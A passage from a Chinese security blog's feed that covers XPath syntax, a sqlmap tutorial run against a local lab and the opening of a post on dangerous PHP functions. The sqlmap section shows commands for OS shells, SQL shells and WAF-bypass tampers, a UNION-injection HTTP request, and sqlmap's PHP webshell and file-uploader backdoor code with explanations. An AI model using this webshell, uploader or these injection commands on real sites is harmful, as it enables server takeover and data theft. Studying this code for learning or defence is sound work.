title="谓语（Predicates）"></a>谓语（Predicates）</h3><p><strong>谓语</strong> 是用来查找某个特定的节点或者包含某个指定的值的节点，<strong>被嵌在方括号里</strong>。</p><p><br>一些带有谓语的路径表达式：</p><table><thead><tr><th align="center">路径表达式</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">/html/body/form/input[1]</td><td align="center">假定form表单（元素）里有多个input子元素，选取第一个input元素</td></tr><tr><td align="center">/html/body/form/input[last()]</td><td align="center">假设同上，选取最后一个 input 元素</td></tr><tr><td align="center">/html/body/form/intpu[last()-1]</td><td align="center">假设同上，选取倒数第二个 input 元素</td></tr><tr><td align="center">//body/form/input[position()&lt;3]</td><td align="center">假设同上，选取头两个 input 元素</td></tr><tr><td align="center">//p[@class]</td><td align="center">选取所有拥有 class 属性的 p 元素（节点）</td></tr><tr><td align="center">//p[@id=’some_id’]</td><td align="center">选取所有 id 属性值为 ‘some_id’ 的 p 元素</td></tr><tr><td align="center">/bookstore/book[price&gt;3.19]</td><td align="center">price 是元素，选取 bookstore 元素的所有 book 元素且其子元素 price 得满足&gt;3.19</td></tr><tr><td align="center">/bookstore/book[price&gt;1.08]/title</td><td align="center">选取 bookstore 元素的所有 book 元素（其子元素 price 得满足&gt;1.08）的所有 title 子元素</td></tr></tbody></table><br><h3 id="选取未知节点"><a href="#选取未知节点" class="headerlink" title="选取未知节点"></a>选取未知节点</h3><p>技巧：<strong>使用通配符</strong></p><p><code>*</code> ：     匹配任何元素（节点）</p><p><code>@*</code> ：    匹配任何属性节点</p><p><code>node()</code> ：匹配任何类型的节点（注意：元素只是7种节点的一种）</p><p><strong>示例：</strong></p><table><thead><tr><th align="center">路径表达式</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">/html/*</td><td align="center">选取 html 元素的所有子元素</td></tr><tr><td align="center">//*</td><td align="center">选取文档中的所有元素</td></tr><tr><td align="center">//div[@*]</td><td align="center">选取所有有属性的 div 元素</td></tr></tbody></table><br><h3 id="选取多个路径"><a href="#选取多个路径" class="headerlink" title="选取多个路径"></a>选取多个路径</h3><p><strong>相当于 or（或）</strong>：使用 <code>|</code> 运算符</p><p>举个栗子：</p><table><thead><tr><th align="center">路径表达式</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">//div/form | //p</td><td align="center">选取 div 元素的所有 form 子元素和文档中所有的 p 元素</td></tr><tr><td align="center">//script | //style</td><td align="center">选取文档中所有的 script 元素和 style 元素</td></tr></tbody></table><br>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;什么是 XPath？怎么使用的？什么是路径表达式、Step、路径、节点、元素、节点与元素的区别，等等…&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQLMAP 新手教程（二）</title>
    <link href="https://pwn4justice.github.io/2019/07/02/SQLMAP-%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://pwn4justice.github.io/2019/07/02/SQLMAP-新手教程（二）/</id>
    <published>2019-07-02T09:54:17.000Z</published>
    <updated>2019-08-02T15:36:14.727Z</updated>
    
    <content type="html"><![CDATA[<p>上一节：<a href="https://pwn4justice.github.io/pwn4justice.github.io/2019/06/11/SQLMAP-新手教程（一）/">SQLMAP 新手教程（一）</a><br>本节进一步介绍 SQLMAP 的常见使用。</p><a id="more"></a><h3 id="0x00-SQLMAP-常见参数"><a href="#0x00-SQLMAP-常见参数" class="headerlink" title="0x00 SQLMAP 常见参数"></a>0x00 SQLMAP 常见参数</h3><p><strong>注：</strong> SQLMAP 命令是区分大小写的</p><h4 id="1-测试注入点权限"><a href="#1-测试注入点权限" class="headerlink" title="(1) 测试注入点权限"></a>(1) 测试注入点权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://localhost/diy/sqli.php?id=1&quot; --privileges</span><br><span class="line">// 测试 sa 用户权限（针对 SQL SERVER）</span><br><span class="line">sqlmap.py -u &quot;URL&quot; --privileges -U root</span><br></pre></td></tr></table></figure><p>结果如图：</p><p><img src="privileges.jpg" alt="privileges"></p><br><h4 id="2-执行shell命令"><a href="#2-执行shell命令" class="headerlink" title="(2) 执行shell命令"></a>(2) 执行shell命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;URL&quot; --os-cmd=&quot;ping 127.0.0.1&quot;</span><br><span class="line">sqlmap.py -u &quot;URL&quot; --os-shell</span><br></pre></td></tr></table></figure><p>执行 <code>--os-cmd=&quot;ping xxx&quot;</code>的时候，首先会收到 SQLMAP 的提示，是否知道 web 应用的编程语言？此处选择 PHP，也是默认选项。然后 SQLMAP 识别了网站绝对路径，并且上传了2个临时的随机命名的 PHP 脚本文件（后门）至网站根目录，如图：</p><p><img src="language_upload.jpg" alt="language_upload"></p><p>接着会询问是否显示<strong>命令行标准输出</strong>，选择 Y：</p><p><img src="ping.jpg" alt="ping"></p><p>执行 <code>--os-shell</code> 的时候，除了上述那些内容外，还会反弹一个命令行 Shell，并且可以支持 Linux 命令（尽管服务器是 Win 系统）：</p><p><img src="cmd_shell.jpg" alt="cmd-shell"></p><p>来查看一下 SQLMAP 为我们创建的那两个后门文件的内容：</p><p><img src="door.jpg" alt="show_door"></p><p>找个网站格式化一下，终极内容如下：</p><p>code1.php：</p><p><img src="code1.jpg" alt="code"></p><p>和 code2.php：（虽然我也不知道为啥第二个文件开始要有 admin admin 这两个字段…）</p><p><img src="code2.jpg" alt="code"></p><p><strong>后门代码分析：</strong></p><p>主要函数：</p><p><strong>set_time_limit( int ): bool</strong></p><p><strong>解释：</strong>设置此脚本的最大运行时间（可叠加），当时间到了，就会返回一个致命的错误。默认值是30秒，或者你也可以在 <code>php.ini</code> 文件中设置这个值：<code>max_execution_time</code> 。</p><p>当被调用的时候，这个函数将计数器置为0，如果接下来的语句又设置了这个函数，那么总时间会叠加；当使用 <code>set_time_limit(0)</code> 的时候，则代表没有时间限制。</p><p>返回值：成功返回<strong>真</strong>（TRUE），失败返回<strong>假</strong>（FALSE）</p><p><strong>ignore_user_abort( [bool $value] ) : int</strong></p><p><strong>解释：</strong> 设置当客户端失去连接时是否终止脚本，应该是 webshell 常用？</p><p>当PHP脚本被当作命令行脚本时，除非 <em>value</em> 设置成 <strong>TRUE</strong>，否则如果脚本的 tty 退出了 而脚本却没有正常终止的话，下次尝试写入数据时就会崩溃。<strong>应该是设置为真后，可以保持长连接？？</strong></p><p>如果设置了 value 值，则在 ini 文件会更新；如果没有，则函数会返回以前的设置（一个整数值）</p><p><strong>ini_set( string $varname, string $newvalue ) : string</strong></p><p><strong>解释：</strong>给配置选项设置一个值。在脚本执行期间都会保持该值，结束时恢复。</p><p>不过不是所有的配置选项（php.ini文件中的选项）都支持用这个函数设置，该列表里的值可以：<a href="php.net/manual/en/ini.list.html">appendix</a></p><p>如果成功，则返回老值，失败返回 FALSE</p><p><strong>ini_get( string $varname ) : string</strong></p><p><strong>解释：</strong>取得配置选项的值</p><p><strong>preg_replace( mixed $pattern, mixed ​$replacement, mixed $subject [, int ​$limit = -1 [, int $count ]] ) : mixed</strong></p><p><strong>解释：</strong>正则表达式替换</p><p>模式：可以是字符串也可以是字符串数组</p><p>subject：要被替换的字符串数组或者字符串</p><p>limit：每个subject的每个模式下最大可能替换数。-1 代表不限制</p><p><strong>explode( string $delimiter, string $string [, int $limit = PHP_INT_MAX ]) : array</strong></p><p><strong>解释：</strong>返回一个字符串数组，每一项都是string参数中由delimiter字符分开的字符串，相当于py的split()</p><p><strong>array_map( callable $callback, array $array1 [, array $…] ) : array</strong></p><p><strong>解释：</strong>相当于py的 map()，将回调函数映射到每个数组元素上去，返回一个数组。</p><p>callback 可以传一个 NULL，一般传入一个字符串，且存在以这个字符串为名的函数。</p><p><strong>ob_start ([ callable $output_callback = NULL [, int $chunk_size = 0 [, int $flags  = PHP_OUTPUT_HANDLER_STDFLAGS ]]] ) : bool</strong></p><p><strong>解释：</strong>这个函数会打开输出缓冲区，即任何向浏览器产生输出的函数，输出的内容都不会直接自动发送给浏览器了，而是暂时先缓存下来，直到手动调用 <code>flush</code> 、<code>ob_get_contents</code>、 <code>ob_get_clean</code>  或者 <code>ob_end_flush</code> 才将数据输出，可以拦截的输出函数有：<code>echo</code> 、<code>system</code> 、<code>passthru</code> 等</p><p><strong>is_callable( mixed $var [, bool $syntax_only = FALSE [, string &amp;$callable_name ]] ) : bool</strong></p><p><strong>解释：</strong>验证一个字符串（或者一个字符串数组里）是否有同名的函数可供调用。</p><p><strong>in_array ( mixed $needle, array $haystack [, bool $strict = FALSE ] ) : bool</strong></p><p><strong>解释：</strong>查找 needle 在 数组 中是否存在，默认宽松模式，除非设置了 strict 值（同时检查类型）。</p><p>返回；找到就返回 TRUE 否则返回 FALSE</p><p><strong>ob_get_clean( void ) : string</strong></p><p><strong>解释：</strong>取得当前缓冲区内容并删除当前的输出缓冲区，执行了 <code>ob_get_contents()</code> 和 <code>ob_end_clean()</code>，输出缓冲区必须是由携带 <code>PHP_OUTPUT_HANDLER_CLEANABLE</code> 和 <code>PHP_OUTPUT_HANDLER_REMOVEABLE</code> 标志的 <code>ob_start()</code> 函数开启，否则将会无效。</p><p>返回输出缓冲区里的内容并结束输出缓冲操作。如果输出缓冲一开始就没有被激活的话，会返回 FALSE</p><p><strong>proc_open( string $cmd , array $descriptorspec , array &amp;$pipes [ , string $cwd = NULL [ ,array $env = NULL [ , array $other_options = NULL ] ] ]  ) : resource</strong></p><p><strong>解释：</strong>和 <code>popen()</code> 相似，但是在程序执行时提供了更好的控制力度。</p><p>参数：</p><p>cmd：要执行的命令</p><p>descriptorspec：一个数组，数组索引 0 代表 stdin，1 代表 stdout，2 代表 stderr；每个数组元素的第一个元素是描述符类型，第二个元素是给定类型的选项。有效类型是pipe(第二个元素是r，用于将管道的读端传递给进程，或者是w，用于传递写端)和file(第二个元素是文件名)。</p><p>pipes：将被设置为文件指针的索引数组，该数组对应于所创建的任何管道的PHP端。0:stdin；1:stdout；2:stderr</p><p>cwd：该命令的初始工作目录。这必须是一个绝对目录路径，如果想使用默认值(当前PHP进程的工作目录)，则为NULL。</p><p>env：一个数组，其中包含将运行的命令的环境变量，或NULL，以使用与当前PHP进程相同的环境。</p><p>other_options：额外选项，目前支持：</p><ul><li>suppress_errors (windows only): 当改值设置成 <strong>TRUE</strong> 时，则将抑制函数生成的错误。</li><li>bypass_shell (windows only): 当设置为 *<em>TRUE *</em>时，绕过 cmd.exe shell</li></ul><p><strong>shell_exec( string $cmd ) : string</strong></p><p><strong>解释：</strong>通过shell执行命令并且以字符串格式返回完整的输出内容</p><p>返回命令执行结果或者 NULL（如果发生错误，或者命令没有产生任何输出时）</p><p><strong>proc_close( resource $process ) : int</strong></p><p><strong>解释：</strong>关闭由 <code>proc_open</code> 打开的进程并且返回进程的退出码，-1 代表出错</p><p><strong>passthru( string $command, [, int &amp;$return_var ] ) : void</strong></p><p><strong>解释：</strong>执行外部程序并且展示原始输出。</p><p>passthru()函数类似于exec()函数，因为它执行一个命令。当Unix命令的输出是二进制数据，需要直接传递回浏览器时，应该使用这个函数来代替exec()或system()。它的一个常见用途是执行一些类似pbmplus实用程序的操作，这些实用程序可以直接输出图像流。通过将Content-type设置为image/gif，然后调用pbmplus程序来输出gif，可以创建直接输出图像的PHP脚本。</p><p><strong>popen( string $command, string $mode ) : resource</strong></p><p><strong>解释：</strong>为 command 命令派生的进程打开一个管道。</p><p>如果出错：返回 FALSE；返回与fopen()返回的文件指针相同的文件指针，但它是单向的(可能只用于读取或写入)，并且必须使用pclose()关闭。这个指针可以与fgets()、fgetss()和fwrite()一起使用。当模式为“r”时，返回的文件指针等于命令的STDOUT，当模式为“w”时，返回的文件指针等于命令的STDIN。</p><p><strong>is_resource ( mixed $var ) : bool</strong></p><p><strong>解释：</strong>判断所给变量是否是一个 resource，如果是，返回 TRUE，否则返回 FALSE</p><p><strong>resource：</strong>资源是一个特殊的变量，包含对外部资源的引用。资源由特殊函数创建和使用。有关所有这些函数和相应资源类型的列表，请参见附录。</p><p><strong>exec ( string $command [, array &amp;$output [, int &amp;$return_var ] ] ) : string</strong></p><p><strong>解释：</strong>执行给定的命令。</p><p>如果有output参数，那么指定的数组将被命令的每一行输出填充。后面的空格，如\n，不包括在这个数组中。注意，如果数组已经包含一些元素，exec()将追加到数组的末尾。如果不希望函数附加元素，请在将数组传递给exec()之前调用unset()。</p><p>如果return_var参数和output参数一起出现，那么执行的命令的返回状态将被写入这个变量。</p><p><strong>chr( int $bytevalue ) : string</strong></p><p><strong>解释：</strong>从一个数字生成一个单子节字符串</p><p>返回一个单字符字符串，其中包含通过将bytevalue解释为无符号整数指定的字符。</p><p><strong>join() —&gt; implode ( string $glue, array $pieces ) : string 的别名</strong></p><p><strong>解释：</strong>用 glue 字符串连接数组元素</p><p>或 <code>implode ( array $pieces ) : string</code></p><p><strong>move_uploaded_file ( string $filename, string $destination ) : bool</strong></p><p><strong>解释：</strong>移动一个已上传的文件到一个新的位置。</p><p>这个函数检查以确保文件名指定的文件是一个有效的上传文件(这意味着它是通过PHP的HTTP POST上传机制上传的)。如果文件是有效的，它将被移动到目的地提供的文件名。</p><p>如果上传文件的任何操作都有可能向用户甚至同一系统上的其他用户显示其内容，那么这种检查尤其重要。</p><p>成功返回 TRUE；如果文件名不是有效的上传文件，则不会执行任何操作，move_uploaded_file()将返回FALSE。如果文件名是一个有效的上传文件，但由于某种原因不能移动，则不会发生任何操作，move_uploaded_file()将返回FALSE。此外，还会发出警告。</p><br><p>文件分析：</p><p><strong>code1.php :</strong></p><p>先是在开头设置了配置选项，并用 $c 来接受请求参数，也就是接受命令的地方，在“菜刀”中被称为口令？或者“密码”，whatever，使用 $z 来得到配置文件 禁止了哪些 高危函数，如果管理员设置了 <code>disable_functinos</code> 则用正则表达式等工具提取出已被禁用的函数，组成列表，方便上下文来查询某个命令是否可以执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$c = $_REQUEST[<span class="string">"cmd"</span>];</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">@ini_set(<span class="string">"max_execution_time"</span>, <span class="number">0</span>);</span><br><span class="line">$z = @ini_get(<span class="string">"disable_functions"</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($z)) &#123;</span><br><span class="line">        $z = preg_replace(<span class="string">"/[, ]+/"</span>, <span class="string">','</span>, $z);</span><br><span class="line">        $z = explode(<span class="string">','</span>, $z);</span><br><span class="line">        $z = array_map(<span class="string">"trim"</span>, $z);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $z = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>f( $n )</code> 函数就是用来判断函数能不能被执行的，同时将命令末尾加上错误重定向：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$c = $c.<span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span><span class="params">($n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $z;</span><br><span class="line">        <span class="keyword">return</span> is_callable($n) <span class="keyword">and</span> ! in_array($n, $z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是一步一步测试哪个高危PHP函数（见:<a href="https://pwn4justice.github.io/pwn4justice.github.io/2019/07/01/高危PHP函数/">高危PHP函数列表</a>）没有被管理员禁止，并调用那个函数来执行系统命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (f(<span class="string">"system"</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        system($c);</span><br><span class="line">        $w = ob_get_clean();</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">"proc_open"</span>)) &#123;</span><br><span class="line">        $y = proc_open($c, <span class="keyword">array</span>(<span class="keyword">array</span>(pipe, r), <span class="keyword">array</span>(pipe, w), <span class="keyword">array</span>(pipe, w)), $t);</span><br><span class="line">        $w = <span class="keyword">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (!feof($t[<span class="number">1</span>])) &#123; $w. = fread($t[<span class="number">1</span>], <span class="number">512</span>); &#125;@proc_close($y);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">"shell_exec"</span>)) &#123;</span><br><span class="line">        $w = shell_exec($c);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">"passthru"</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru($c);</span><br><span class="line">        $w = ob_get_clean();</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">"popen"</span>)) &#123;</span><br><span class="line">        $x = popen($c, r);</span><br><span class="line">        $w = <span class="keyword">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_resource($x)) &#123;</span><br><span class="line">                <span class="keyword">while</span> (!feof($x)) &#123; $w.= fread($x, <span class="number">512</span>); &#125;</span><br><span class="line">        &#125;@pclose($x);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">"exec"</span>)) &#123;</span><br><span class="line">        $w = <span class="keyword">array</span>();</span><br><span class="line">        exec($c, $w);</span><br><span class="line">        $w = join(chr(<span class="number">10</span>), $w).chr(<span class="number">10</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; $w = <span class="number">0</span>; &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$w"</span></span><br></pre></td></tr></table></figure><br><p><strong>code2.php</strong></p><p>这个 PHP 文件是用来处理上传的（小马？），应该是 SQLMAP 用来将上文那个 PHP webshell 文件上传至服务器，它构造了一个表单，并由 SQLMAP 填充需要上传的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;form action="</span>.$_SERVER[<span class="string">"PHP_SELF"</span>].<span class="string">" method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=D:\phpStudy5.2\WWW\&gt;&lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;"</span>;</span><br></pre></td></tr></table></figure><p>对不同 PHP 版本的判断并上传：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">        $dir = $_REQUEST[<span class="string">"uploadDir"</span>];</span><br><span class="line">        <span class="keyword">if</span> (phpversion() &lt; <span class="string">'4.1.0'</span>) &#123;</span><br><span class="line">                $file = $HTTP_POST_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">@move_uploaded_file($HTTP_POST_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $dir.<span class="string">"/"</span>.$file) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $file = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">@move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $dir.<span class="string">"/"</span>.$file) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">        &#125;@chmod($dir.<span class="string">"/"</span>.$file, <span class="number">0755</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File uploaded"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h4 id="3-获取当前数据库名称"><a href="#3-获取当前数据库名称" class="headerlink" title="(3) 获取当前数据库名称"></a>(3) 获取当前数据库名称</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://127.0.0.1/diy/sqli.php&quot; --current-db</span><br></pre></td></tr></table></figure><p><img src="currentdb.jpg" alt="currentdb"></p><br><h4 id="4-执行SQL命令"><a href="#4-执行SQL命令" class="headerlink" title="(4) 执行SQL命令"></a>(4) 执行SQL命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://127.0.0.1/diy/sqli.php&quot; --sql-shell</span><br><span class="line">sqlmap.py -u &quot;http://127.0.0.1/diy/sqli.php&quot; --sql-query=&quot;sql&quot;</span><br></pre></td></tr></table></figure><p><strong>直接查询单条 sql 语句</strong></p><p><img src="sql_query.jpg" alt="sql_query"></p><p><strong>--sql-shell</strong></p><ol><li>爆库、爆表</li></ol><p><img src="sql_shell1.jpg" alt="sql_shell1"></p><ol start="2"><li>查询字段</li></ol><p><img src="sql_shell2.jpg" alt="sql_shell2"></p><ol start="2"><li>查询数据</li></ol><p><img src="sql_shell3.jpg" alt="sql_shell3"></p><br><h4 id="5-POST提交方式"><a href="#5-POST提交方式" class="headerlink" title="(5) POST提交方式"></a>(5) POST提交方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;url&quot; --data &quot;POST 参数&quot;</span><br></pre></td></tr></table></figure><br><h4 id="6-显示详细的等级"><a href="#6-显示详细的等级" class="headerlink" title="(6) 显示详细的等级"></a>(6) 显示详细的等级</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;url&quot; --dbs -v 1</span><br></pre></td></tr></table></figure><p>-v 参数包含如下7个等级：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0: 只显示 Python 的回溯信息或者错误信息</span><br><span class="line">1: 显示信息和警告信息</span><br><span class="line">2: 显示调试信息</span><br><span class="line">3: 有效载荷注入</span><br><span class="line">4: 显示 HTTP 请求</span><br><span class="line">5: 显示 HTTP 响应头</span><br><span class="line">6: 显示 HTTP 响应页面的内容</span><br></pre></td></tr></table></figure><p>显示 HTTP 请求示例：</p><blockquote><p>sqlmap.py -u “http://127.0.0.1/diy/sqli.php?id=1” --dbs -v4</p></blockquote><p><img src="http_header.jpg" alt="http-header"></p><br><h4 id="7-注入-HTTP-请求"><a href="#7-注入-HTTP-请求" class="headerlink" title="(7) 注入 HTTP 请求"></a>(7) 注入 HTTP 请求</h4><p>1.构造 Header 文件：Header.txt:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /diy/sqli.php?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x7171767071%2CIFNULL%28CAST%28COUNT%28schema_name%29%20AS%20CHAR%29%2C0x20%29%2C0x71766a7171%29%2CNULL%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20tiSJ HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-control: no-cache</span><br><span class="line">Accept-encoding: gzip,deflate</span><br><span class="line">Accept: */*</span><br><span class="line">User-agent: sqlmap/1.3.7.28#dev (http://sqlmap.org)</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>2.使用指定的 Header 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r Header.txt --dbs</span><br></pre></td></tr></table></figure><p><img src="r_txt1.jpg" alt="-r_txt"></p><p>使用上面构造的 Header 识别有些问题，但最终 SQLMAP 还是会返回结果，将上面 <code>id=1</code> 后面的手工注入语句删除就可以。</p><p><img src="r_txt2.jpg" alt="r_txt2.jpg"></p><br><h4 id="8-将注入语句插入到指定位置"><a href="#8-将注入语句插入到指定位置" class="headerlink" title="(8) 将注入语句插入到指定位置"></a>(8) 将注入语句插入到指定位置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://www.xxx.com/id/2*.html&quot; --dbs</span><br></pre></td></tr></table></figure><p>有些网址采用了伪静态界面，这是 SQLMAP 就无法识别出哪里是对服务器提交的请求参数，所以提供了一个 * 用于将 SQL 语句插入指定位置。也可以结合 <code>-r</code> 选项，在 Header.txt 里使用，来占位。</p><p>如，使用：<code>sqlmap.py -u &quot;http://pwn4justice.github.io/2019/06/27/SQL*.html&quot; --dbs -v4</code></p><p><img src="pos.jpg" alt="pos"></p><br><h4 id="9-学会使用插件"><a href="#9-学会使用插件" class="headerlink" title="(9) 学会使用插件"></a>(9) 学会使用插件</h4><p>SQLMAP 自带了很多插件，可针对注入的 SQL 语句进行编码等操作，插件都保存在 SQLMAP 的 tamper 目录下，而且有些插件可以绕过 WAF，使用语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u URL -tamper &quot;插件名称.py&quot;</span><br></pre></td></tr></table></figure><p><img src="plugins.jpg" alt="plugins"></p><h4 id="10-直连数据库与注入等级"><a href="#10-直连数据库与注入等级" class="headerlink" title="(10) 直连数据库与注入等级"></a>(10) 直连数据库与注入等级</h4><p>直连数据库：</p><blockquote><p>sqlmap.py -d “mysql://username:password@location:port/dbname” --dbs</p></blockquote><p>注入等级：</p><blockquote><p>sqlmap.py -u URL --level 3</p></blockquote><br><h3 id="0x01-小结"><a href="#0x01-小结" class="headerlink" title="0x01 小结"></a>0x01 小结</h3><p>其他更多使用，可以参考：<code>https://www.cnblogs.com/dgjnszf/p/10808125.html</code></p><p>使用 <code>sqlmap.py -hh</code> 查看详细帮助<br></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;上一节：&lt;a href=&quot;https://pwn4justice.github.io/pwn4justice.github.io/2019/06/11/SQLMAP-新手教程（一）/&quot;&gt;SQLMAP 新手教程（一）&lt;/a&gt;&lt;br&gt;本节进一步介绍 SQLMAP 的常见使用。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>高危PHP函数</title>
    <link href="https://pwn4justice.github.io/2019/07/01/%E9%AB%98%E5%8D%B1PHP%E5%87%BD%E6%95%B0/"/>
    <id>https://pwn4justice.github.io/2019/07/01/高危PHP函数/</id>
    <published>2019-07-01T07:54:30.000Z</published>
    <updated>2019-08-01T10:34:46.625Z</updated>
    
    <content type="html"><![CDATA[<p>笔记内容：PHP的危险函数，和 php.ini 里的 disable_functions 设置，以及整理了一些绕过 disable_functions 的思路。</p><a id="more"></a><p>[非原创] [记录待复现系列]</p><p><strong>危险函数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 